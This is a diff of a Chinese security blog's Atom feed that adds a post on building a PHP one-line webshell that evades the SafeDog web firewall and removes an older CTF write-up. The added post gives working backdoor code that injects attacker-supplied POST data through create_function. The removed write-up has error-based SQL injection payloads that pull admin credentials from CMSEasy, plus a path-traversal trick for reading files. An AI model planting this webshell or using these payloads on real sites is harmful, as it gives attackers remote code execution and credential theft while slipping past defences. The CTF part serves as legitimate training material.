@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://black0saturday.github.io/"/>
-  <updated>2020-04-11T03:27:48.925Z</updated>
+  <updated>2020-04-14T04:51:09.589Z</updated>
   <id>http://black0saturday.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>过狗一句话编写</title>
+    <link href="http://black0saturday.github.io/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/"/>
+    <id>http://black0saturday.github.io/2020/04/13/过狗一句话编写/</id>
+    <published>2020-04-13T04:12:54.000Z</published>
+    <updated>2020-04-14T04:51:09.589Z</updated>
+    
+    <content type="html"><![CDATA[<p>安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现，正常的POST数据不拦截，然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。<br><a id="more"></a></p><p>因此就想着试一试.选择的函数是create_function函数，create_function函数接收两个参数$args 和 $code 然后组成新函数function_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行了。</p><h3 id="构造-code"><a href="#构造-code" class="headerlink" title="构造$code"></a>构造$code</h3><p>$code = “n;}$_POST[x];/*”;</p><p>解释一下构造的$code:</p><ul><li>双引号中$_POST[x]被执行(这里以提交x=phpinfo();为例)</li><li>;来结束语句</li><li>}来结束函数体</li></ul><p>phpinfo();;就在函数体外面被eval执行了</p><p>/*注释多余的代码</p><p>最终代码：<code>eval(function_lambda_func($args){n;}phpinfo();;/*})</code></p><p>那么phpinfo()就被执行了.</p><p>如图：<br><img src="/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/1.png" alt><br>过狗测试：<br><img src="/2020/04/13/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99/2.png" alt></p><p>最终代码：</p><pre><code>&lt;?php     $args = &quot;tony&quot;;    $code = &quot;n;}$_POST[x];/*&quot;;    echo create_function(&apos;$args&apos;,$code);?&gt;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;安全狗查杀一句话的时候，通常检测eval 和 $_POST[x]有没有同时出现，正常的POST数据不拦截，然后我们将POST来的数据放到存在代码执行漏洞的函数中，这样，POST来的数据就被执行了。&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
+    
+  </entry>
   
   <entry>
     <title>构造优质上传漏洞Fuzz字典</title>
@@ -403,29 +423,6 @@
       &lt;p&gt;刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;题目名称：再见CMS&lt;br&gt;题目内容：这里还是有一个小脑洞&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="CMS" scheme="http://black0saturday.github.io/tags/CMS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Yeser-CMS漏洞利用</title>
-    <link href="http://black0saturday.github.io/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    <id>http://black0saturday.github.io/2018/09/20/Yeser-CMS漏洞利用/</id>
-    <published>2018-09-20T09:47:42.000Z</published>
-    <updated>2019-12-30T10:31:51.362Z</updated>
-    
-    <content type="html"><![CDATA[<p>刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下</p><blockquote><p>题目内容：新的CMS系统，帮忙测测是否有漏洞。<br>tips:flag在网站根目录下的flag.php中</p></blockquote><a id="more"></a><p>首先去百度了一下，是没有这个cms的，那么看一下这个网站看有没有有用的信息<br>我看先看一下这个文件：<code>http://0b572aacb0994d6fb941349a346cae04c9d7fafc8afd42b6.game.ichunqiu.com/robots.txt</code><br>这个文件的作用是告诉我们哪些网站能爬，哪些不饿能爬，不过它里面有时候会放一些重要的东西</p><p>页面显示如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># robots.txt for YeserCMS</span><br><span class="line"># Version 5.0.0</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line"></span><br><span class="line">Disallow:&#x2F;admin&#x2F;</span><br><span class="line">Disallow:&#x2F;cache&#x2F;</span><br><span class="line">Disallow:&#x2F;common&#x2F;</span><br><span class="line">Disallow:&#x2F;config&#x2F;</span><br><span class="line">Disallow:&#x2F;fckeditor&#x2F;</span><br><span class="line">Disallow:&#x2F;htaccess&#x2F;</span><br><span class="line">Disallow:&#x2F;images&#x2F;</span><br><span class="line">Disallow:&#x2F;install&#x2F;</span><br><span class="line">Disallow:&#x2F;js&#x2F;</span><br><span class="line">Disallow:&#x2F;lib&#x2F;</span><br><span class="line">Disallow:&#x2F;template&#x2F;</span><br><span class="line">Disallow:&#x2F;upload&#x2F;</span><br><span class="line">Disallow:&#x2F;celive&#x2F;</span><br><span class="line">Disallow:flag.php</span><br></pre></td></tr></table></figure><br>可以好几个比较重要的目录和文件</p><p>先放到这，然后我们继续寻找有用的信息<br>在文档下载页面，随便点一个文档进去，拉到最下面的评论区可以在我要评论里面看到网站的框架是CMSEASY<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png" alt></p><pre><code>百度了一下CMSeasy，发现这确实是一个CMS，而且是有漏洞的https://www.seebug.org/appdir/CmsEasy使用无限制报错注入https://www.seebug.org/vuldb/ssvid-94084</code></pre><p>这个网站存在报错注入，大概思路就是：<br>通过报错注入获得管理员用户名和密码<br>然后通过上边的<code>robots.txt</code>我们可以看到后台目录是：<code>/admin/</code><br>我们直接登陆后台，漏洞在后台页面上</p><p>接下来的问题就是如何获得用户名和密码，通过上边这篇文档提供的方法，直接把payload拿来用了：<br>存在注入漏洞的页面是：<code>url/celive/live/header.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那么我们访问这个页面，同时postdata:xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,substring((SELECT&#x2F;**&#x2F;GROUP_CONCAT(username,password) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- &lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br></pre></td></tr></table></figure><br>这样确实得到了回显，有用户名，但是密码好像是不全的<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">接下来直接只查看完整的密码的md5</span><br><span class="line">xajax&#x3D;Postdata&amp;xajaxargs[0]&#x3D;&lt;xjxquery&gt;&lt;q&gt;detail&#x3D;xxxxxx%2527%252c(UpdateXML(1%252cCONCAT(0x5b%252csubstring((SELECT%252f**%252fGROUP_CONCAT(username%252cpassword)%2bfrom%2byesercms_user)%252c7%252c39)%252c0x5d)%252c1))%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL%252cNULL)--%2b&lt;&#x2F;q&gt;&lt;&#x2F;xjxquery&gt;</span><br><span class="line"></span><br><span class="line">页面返回如下</span><br><span class="line">XPATH syntax error: &#39;[f512d4240cbbdeafada404677ccbe61&#39;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;INSERT INTO &#96;yesercms_detail&#96; (&#96;chatid&#96;,&#96;detail&#96;,&#96;who_witter&#96;) VALUES(&#39;&#39;,&#39;xxxxxx&#39;,(UpdateXML(1,CONCAT(0x5b,substring((SELECT&#x2F;**&#x2F;GROUP_CONCAT(username,password) from yesercms_user),7,39),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--  (2018-08-13 16:22:21)&#39;,&#39;2&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png" alt><br>然后就知道了</p><pre><code>用户名admin，密码ff512d4240cbbdeafada404677ccbe61，md5解密为Yeser231。</code></pre><p>这里推荐一个md5在线解码网站，可以直接解出来这个值：<code>http://www.dmd5.com/md5-decrypter.jsp</code><br>然后我们就可以进入后台了，在后台直接登陆就行</p><p><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png" alt></p><p>登陆后就进入了后台<br>还是查看的别人的文章，CMSeasy在后台有一个任意文件查看的漏洞<br>我们点击<code>模板</code>，然后选择<code>当前模板编辑</code>，然后抓个包，点击编辑<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png" alt><br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png" alt><br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/7.png" alt><br>在包的最下边会看到：<code>&amp;id=#footer_html</code>这个东西<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/8.png" alt></p><p>把它修改成<code>&amp;id=../../flag.php</code><br>这就是任意文件查看漏洞<br>之后发送包，我们要的flag就出来了<br><img src="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/9.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;题目内容：新的CMS系统，帮忙测测是否有漏洞。&lt;br&gt;tips:flag在网站根目录下的flag.php中&lt;/p&gt;
-&lt;/blockquote&gt;
     
     </summary>
     
